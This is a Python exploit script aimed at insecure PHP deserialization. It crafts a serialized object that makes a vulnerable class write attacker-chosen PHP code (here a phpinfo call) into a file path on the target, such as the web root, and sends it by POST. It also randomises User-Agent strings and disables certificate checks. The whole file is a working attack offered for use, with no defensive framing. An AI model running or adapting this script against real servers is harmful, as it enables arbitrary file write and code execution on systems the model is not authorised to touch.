#!/usr/bin/python3
import requests
import urllib3
import os
import sys
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = "http://localhost:8080"
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 3

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

# Custom headers
def http_headers():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    headers = {
        'User-Agent': useragent,
    }
    return headers

def create_payl(base_payl,used_class,out_file,injection):
    new_payl = base_payl.replace("SIZE1", str(len(used_class))).replace("CLASS", used_class)
    new_payl = new_payl.replace("SIZE2", str(len(out_file))).replace("OUTPUT_FILE", out_file)
    new_payl = new_payl.replace("SIZE3", str(len(injection))).replace("INJECTION", injection)
    return new_payl

# Main
def main(argv):
    if len(sys.argv) == 4:
        used_class = sys.argv[1]
        out_file = sys.argv[2]
        url = sys.argv[3]
    else:
        print("[*] Usage: " + sys.argv[0] + " <used_class> <out_file> <url>")
        print("[*] Example: " + sys.argv[0] + " Info /var/www/html/phpinfo.php http://192.168.10.2/index.php\n")
        exit(0)

    # Do stuff
    try:
        headers = http_headers()
        base_payl = 'O:SIZE1:"CLASS":2:{s:8:"filename";s:SIZE2:"OUTPUT_FILE";s:4:"data";s:SIZE3:"INJECTION";}'
        injection = "<?php phpinfo(); ?>"
 
        new_payl = create_payl(base_payl,used_class,out_file,injection)
        print("[*] Using payload: " + new_payl)
 
        post_data = {'param':new_payl}
        print("[*] Sending request...")
        r = requests.post(url,data=post_data,verify=False,headers=headers,timeout=timeout)

    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
        exit(-1)
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print("[!] " + e)
        exit(-1)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
